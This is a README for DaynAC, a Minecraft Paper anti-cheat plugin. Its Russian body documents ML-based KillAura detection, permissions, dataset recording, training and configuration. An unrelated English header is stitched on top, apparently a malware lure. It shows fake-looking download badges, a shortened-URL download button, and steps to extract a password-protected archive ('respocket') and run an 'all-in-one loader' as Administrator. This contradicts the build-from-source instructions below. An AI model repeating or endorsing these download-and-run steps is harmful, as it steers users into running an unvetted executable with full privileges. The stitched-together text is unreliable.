<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## Особенности

- **Модель под ваш сервер.** Никаких готовых сигнатур: сетка учится на данных, которые вы записали у себя - легит и читы играют ваши же люди.
## Как это работает

```mermaid
flowchart TB
    hit["Удар игрока<br/>ENTITY_ATTACK, оба - игроки"] --> track["SnapshotTracker<br/>снимки поворота и скорости за тик"]
    track --> hitdata["HitData<br/>21 признак на удар"]
    hitdata --> feat["FeatureExtractor<br/>окно из 16 ударов<br/>16 × 21 + 7 агрегатов = 343 признака"]
    feat --> nn["NeuralNetwork<br/>343 → 128 → 64 → 32 → 1<br/>чистый Kotlin"]
    nn --> score["Вероятность чита 0…1<br/>на каждый удар"]
    score --> rule{"Пороги"}
    rule -->|"скор ≥ 0.65"| alert["Алерт админам"]
    rule -->|"среднее ≥ 0.70"| reduce["Снижение урона<br/>множитель ≈ 0.83 → 0.67"]
    rule -->|"среднее ≥ 0.90"| cancel["Отмена урона"]
    rule -->|"≥ 0.95 в 2 независимых окнах"| punish["Кик / бан"]
```

**Признаки на каждый удар:** угол прицеливания, дистанция, интервал между ударами и его вариация, энтропия поворотов (abs/signed, yaw/pitch), джиттер, скорость по XZ, плавность вращения, snap-фактор (резкое дожатие прицела), микрокорректировки, рывок (jerk), прямолинейность поворота, reach.

**Агрегаты по окну:** средний угол, коэффициенты вариации, энтропия распределения углов, автокорреляции lag-1 (механическая предсказуемость тайминга и прицела), R² линейного тренда угла (монотонное «дожатие» прицела).

CPS сознательно не используется как признак: в no-cooldown PvP легитимные игроки кликают быстро и стабильно. Механическую регулярность ловит автокорреляция интервалов, а не их абсолютная скорость.

> [!NOTE]
> Учитываются только **попавшие** удары `ENTITY_ATTACK` между игроками. Удары, отменённые другими плагинами, и sweep-атаки мечом в историю не попадают.

---

## Установка

### Требования

| Требование | Значение |
|---|---|
| Сервер | **Paper 1.21.11 или новее** (один и тот же jar; проверено на 1.21.11 и до 26.3) |
| Java | **21+** для 1.21.11 и **25+** для Paper 26.1+ (требование самого сервера; плагин собран под Java 21 и работает на обеих) |

### Сборка из исходников

Для сборки нужен Gradle **9.7** (версия из `gradle/wrapper/gradle-wrapper.properties`; wrapper-скриптов в репозитории нет - CI ставит Gradle сам):

```bash
gradle build               # итоговый jar: build/libs/DaynAC-<version>-all.jar
```

Локальный тест-сервер прямо из проекта:

```bash
gradle runServer                       # Paper 1.21.11 с плагином (2 ГБ RAM)
gradle runServer -PmcVersion=26.1.2    # то же на другой версии Minecraft
```

---

## Права доступа

Права проверяются по подкомандам, поэтому доступ можно выдавать по частям (например, через LuckPerms). Право `daynac.admin` (по умолчанию - op) включает все права ниже, **кроме** `daynac.exempt`.

| Право | Что даёт |
|---|---|
| `daynac.view` | `/daynac ver`, `info`, `allinfo` (только просмотр) |
| `daynac.alerts` | оповещения о подозрительных ударах и лог ударов (`/daynac debug`) в чат |
| `daynac.spectate` | телепорт к игроку из `/daynac allinfo` в режиме наблюдателя и возврат через `/daynac reset` |
| `daynac.record` | `/daynac record` |
| `daynac.train` | `/daynac train`, `eval` |
| `daynac.config` | `/daynac reload`, `debug`, `clearflags` |
| `daynac.exempt.manage` | `/daynac exempt` (выдача и снятие временных исключений) |
| `daynac.exempt` | постоянный иммунитет к детекции; **не входит** в `daynac.admin` |

Пример для LuckPerms:

```
/lp group moderator permission set daynac.view true
/lp group moderator permission set daynac.alerts true
/lp group senior-mod permission set daynac.spectate true
/lp group dataset-team permission set daynac.record true
```

<details>
<summary><b>Что важно знать про права</b></summary>

- Пустая или неизвестная подкоманда требует `daynac.view`, чтобы посторонние не получали список команд.
- **`daynac.record` выдавайте только тем, кто собирает датасет.** Метку `legit`/`cheat` записывающий задаёт вручную: ошибочная или намеренно неверная метка «отравит» модель при следующем `/daynac train`. На время записи игрок не проверяется детекцией.
- `daynac.exempt` отделён от `daynac.admin` намеренно: иначе украденный админ-аккаунт был бы неуязвим для античита, а админы не могли бы проверять плагин на себе. Выдавайте его явно, и только доверенным.
- `daynac.exempt.manage` входит в `daynac.admin`: оператор может выдавать временные исключения другим игрокам. Само по себе это не даёт иммунитета - исключение нужно активировать командой `/daynac exempt`.
- Временные исключения хранятся в `exemptions.yml` и истекают автоматически; постоянный иммунитет (`daynac.exempt`) не истекает.
- Право `daynac.spectate` проверяется заново при каждом клике в GUI, а `daynac.view` - пока GUI открыт: отозванное право действует сразу.

</details>

---

## Сбор датасета

1. Попросите доверенного игрока (или подключите второй аккаунт) поучаствовать в PvP-дуэли.
2. Включите запись:

   ```
   /daynac record <ник> legit    # игрок играет честно
   /daynac record <ник> cheat    # игрок играет с читом
   /daynac record <ник> off      # завершить запись
   ```

3. Вектор признаков записывается каждые 16 ударов (непересекающиеся окна) в `plugins/DaynAC/legit_vectors.csv` и `cheat_vectors.csv`. Игрок в режиме записи не проверяется детекцией - иммунитет на время сбора (постоянный иммунитет даёт право `daynac.exempt`).

К каждому вектору дописываются две колонки метаданных:

- `session_id` - одна запись от `record <ник> legit|cheat` до `off`;
- `player_hash` - псевдоним игрока: SHA-256 от UUID с солью из `dataset.salt`. Сам UUID в CSV не попадает.

В обучение эти колонки не идут, по ним делится выборка. Файлы старого формата обновляются автоматически, перед этим создаётся копия `*.bak`; старые строки остаются без группы. Не теряйте и не публикуйте `dataset.salt`: без неё хэши новых записей не совпадут со старыми.

> [!TIP]
> **Качество данных решает всё:**
>
> - нужны **оба класса** с сопоставимым числом примеров (сотни векторов на класс);
> - разнообразие важнее количества: разные дистанции, движение, жертвы, настройки чита;
> - записывайте **минимум 3 отдельные сессии на каждый класс**, лучше с разными игроками: иначе честное разбиение по группам невозможно;
> - не забывайте про «сложных» легит-игроков (высокий DPI, низкая чувствительность, быстрый аим): именно на них модель чаще всего ошибается.

**Версия признаков.** Если вы меняете определение признаков, увеличьте `FeatureExtractor.FEATURE_VERSION`. При старте плагин сравнит её с `dataset.featver`: несовместимые датасеты переименуются в `<имя>.featv<N>.bak` (ничего не удаляется), а несовместимая модель будет переименована в `model.dat.old`.

---

## Обучение и оценка модели

### `/daynac train`

- Делит датасет 60/20/20 на train/val/test (стратифицированно по классам) и нормализует признаки по train-части.
- Если на каждый класс приходится ≥ 3 групп, делит **целыми группами** (`training.split-by: session` или `player`), чтобы окна одного игрока не попадали одновременно в обучение и тест. Если групп меньше, разбиение случайное по окнам, и плагин предупредит, что метрики завышены.
- Обучает с early stopping по val loss и восстановлением лучших весов. Test-сет в обучении и выборе эпохи не участвует.
- Нужно не меньше 5 векторов каждого класса (на практике - сотни).
- Прогресс виден в реальном времени: прогресс-бар в action bar (игроку) и контрольные точки в чат каждые 10% эпох.
- По завершении: отчёт с train/val/test метриками и разрывом train/val (переобучение), модель сохраняется в `model.dat`, детекция включается автоматически.

Большой разрыв train/val accuracy означает, что данных мало или они однообразны.

### `/daynac eval`

Показывает на test-сете для набора порогов precision, recall, F1 и FPR с 95% доверительным интервалом Уилсона. Порог рекомендуется, только если **верхняя граница** FPR ≤ 1%. Даже при нуле ошибок для этого нужно ≥ 381 легит-окна в test-сете (примерно 1900 легит-векторов во всём датасете). Пока данных меньше, плагин честно скажет, что низкий FPR статистически не подтверждён.

> [!IMPORTANT]
> `eval` работает только в том же запуске сервера, в котором шло обучение: test-сет не сохраняется в `model.dat`.

---

## Как принимаются решения

Вероятность чита считается на **каждый** удар по последним 16 ударам, поэтому соседние оценки почти совпадают (окна перекрываются на 15 из 16 ударов).

| Что | Правило |
|---|---|
| Оповещение (игроки с `daynac.alerts`) | скор текущего удара ≥ `flag-threshold` (0.65) |
| Снижение урона | среднее по последним `max-recent-predictions` (10) предсказаниям ≥ `reduce-threshold` (0.70): множитель плавно падает с ≈0.83 до ≈0.67 |
| Отмена урона | то же среднее ≥ `cancel-threshold` (0.90) |
| Кик / бан | скор ≥ `punish-threshold` (0.95) в `punish-confirm-windows` (2) **независимых** окнах подряд |

Защита от ложных срабатываний:

- множитель урона считается по **предыдущим** предсказаниям, поэтому у игрока без истории первый удар всегда полный;
- независимым считается окно, пришедшее не раньше чем через 16 ударов после предыдущего засчитанного (общих ударов нет). По умолчанию для наказания нужно около 32 ударов подряд на уровне ≥ 0.95. Независимому окну даётся ещё до 8 ударов (половина окна), чтобы показать скор ≥ порога; если и тогда он ниже, серия прерывается;
- после наказания серия «расходуется»: повторное срабатывание потребует новой полной серии;
- inference выполняется асинхронно, главный тик сервера не блокируется.

**Сброс после простоя.** Если игрок не бил никого дольше `inactivity-reset-seconds`, с него снимаются флаги: активные предсказания и окно ударов очищаются, и следующие 16 ударов набирают окно заново. Чтобы читер не получал «чистый лист» после 30 секунд тишины, плагин помнит его средний скор (если он был ≥ `reduce-threshold`) ещё `carry-over-seconds` секунд: скор линейно затухает до нуля, и пока новое окно не набралось, урон считается по нему.

Журнал при сбросе не чистится: в `/daynac allinfo` игрок остаётся с «Последними ударами» и максимумом за всё время, а карточка показывает прогресс нового окна (`Ударов: n/16`) и вердикт «Флаги сняты после простоя». Сброс затрагивает только игроков в сети; флаги вышедших хранятся до TTL-чистки (1 час), чтобы админ успел их разобрать.

**Ручной сброс.** Команда `/daynac clearflags <ник>` снимает флаги и обнуляет окно немедленно, без ожидания простоя. В отличие от сброса по простою, ручной сброс **не сохраняет** carry-over: урон снова проходит целиком с первого удара. Журнал и счётчик ударов также не чистятся.

### Пример чат-оповещения

```
[DaynAC] Steve: необычный удар 0.871 > порога 0.65 - последние удары: 0.31 0.44 0.61 0.87 (средний: 0.54)
```

---

## Конфигурация

`plugins/DaynAC/config.yml`:

```yaml
hit-logging: false           # логирование каждого удара

detection:
  flag-threshold: 0.65       # порог оповещения админам
  reduce-threshold: 0.70     # начало снижения урона
  cancel-threshold: 0.90     # полная отмена урона
  punish-threshold: 0.95     # порог автокика/бана
  punish-confirm-windows: 2  # сколько независимых окон (по 16 ударов) подряд должны быть >= punish-threshold
  punish-enabled: true       # false = без кика/бана (оповещения и снижение урона продолжают работать)
  punish-action: kick        # none | kick | ban
  ban-with-ip: false         # ban: дополнительно банить по IP (NAT-сети могут задеть невиновных)
  punish-reason: "KillAura (обнаружено нейросетью DaynAC)"
  max-recent-predictions: 10 # окно усреднения для урона и наказания
  inactivity-reset-seconds: 30  # простой: дольше этого без ударов флаги снимаются (0 = выкл.)
  carry-over-seconds: 600    # сколько помнить скор после сброса по простою (0 = не помнить)

training:
  split-by: session          # session | player: по чему делить train/val/test
```

> [!IMPORTANT]
> Порядок порогов проверяется при старте: `flag ≤ reduce < cancel ≤ punish`. Пороги читаются один раз при запуске плагина, поэтому после `/daynac reload` их применение требует перезапуска сервера.

---

## Файлы плагина

Всё хранится локально в `plugins/DaynAC/`, телеметрии нет.

| Файл | Назначение |
|---|---|
| `config.yml` | настройки |
| `legit_vectors.csv`, `cheat_vectors.csv` | датасет (векторы + `session_id`, `player_hash`) |
| `dataset.salt` | соль для `player_hash`; не теряйте и не публикуйте |
| `dataset.featver` | версия признаков, с которой собран датасет |
| `model.dat` | обученная модель |
| `exemptions.yml` | временные исключения из детекции (UUID + время истечения) |
| `*.bak`, `model.dat.old` | резервные копии при смене формата или версии признаков |

---

## Архитектура

<details>
<summary><b>Структура исходников и ключевые инженерные решения</b></summary>

```text
src/main/kotlin/zov/grusha/daynAC/
├── DaynAC.kt              # точка входа: события, команды, запись датасета
├── compat/
│   └── Compat.kt          # совместимость версий Paper (action bar)
├── permissions/
│   └── Permissions.kt     # права плагина и таблица «подкоманда → право»
├── exemptions/
│   └── ExemptionManager.kt# временные исключения игроков из детекции
├── tracking/
│   ├── CombatMath.kt      # геометрия: угол прицеливания, дистанция, reach
│   ├── HitData.kt         # снимок признаков одного удара
│   ├── HitTracker.kt      # скользящее окно истории ударов
│   ├── PlayerSnapshot.kt  # дельты вращения/скорости за тик
│   └── SnapshotTracker.kt # тиковые снимки игроков, скользящие метрики
├── ml/
│   ├── FeatureExtractor.kt# окно ударов → вектор 343 признаков
│   ├── DatasetManager.kt  # CSV-датасеты, сессии, версия признаков
│   ├── NeuralNetwork.kt   # MLP + backprop, lock-free inference
│   └── Stats.kt           # доверительные интервалы для /daynac eval
├── detection/
│   └── DetectionEngine.kt # асинхронный inference, пороги, наказания
└── gui/
    └── AllInfoGUI.kt      # GUI наблюдения за игроками
```

Ключевые инженерные решения:

- **Нейросеть без зависимостей.** MLP 343→128→64→32→1 на чистом Kotlin (BCE + SGD + He-init + L2 + градиентный клиппинг). Не нужны ни PyTorch, ни Python.
- **Lock-free inference.** Веса живут в immutable-снапшоте за `AtomicReference`: `predict()` не берёт локов, переобучение на живом сервере не блокирует детекцию.
- **Атомарная публикация модели.** `train` и `loadFrom` сериализованы мьютексом, файл модели пишется через tmp+rename: обрыв сервера не портит `model.dat`.
- **Защита от утечки данных.** Непересекающиеся окна при записи, разбиение по сессиям/игрокам, стратификация по классам, нормализация только по train-части.
- **Версионирование признаков.** Старые датасеты и модели не смешиваются с новыми молча.

</details>

---

## Известные ограничения

- Анализируются только **попавшие** удары. Промахи и взмахи руки не учитываются.
- **Пинг не учитывается.** Угол прицеливания считается по текущей серверной позиции жертвы, без компенсации задержки.
- Модель не поставляется готовой: её качество равно качеству вашего датасета.
- Выходные вероятности не калибруются: значение 0.70 не обязательно означает «70% чит». Ориентируйтесь на `/daynac eval`, а не на абсолютные числа.
- `punish-enabled: false` отключает только кик/бан. Снижение и отмена урона остаются активными, отдельного выключателя пока нет.

---

## Разработка

```bash
gradle test          # юнит-тесты (детекция, трекинг, ML-модуль, права; ≈200 тестов)
gradle build         # тесты + сборка shadowJar
```

`PermissionsTest` сверяет `Permissions.kt` с `plugin.yml`: добавляя право, обновляйте оба файла.

## Лицензия

MIT


---

MIT License

Copyright (c) 2026 6llgrushall6

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
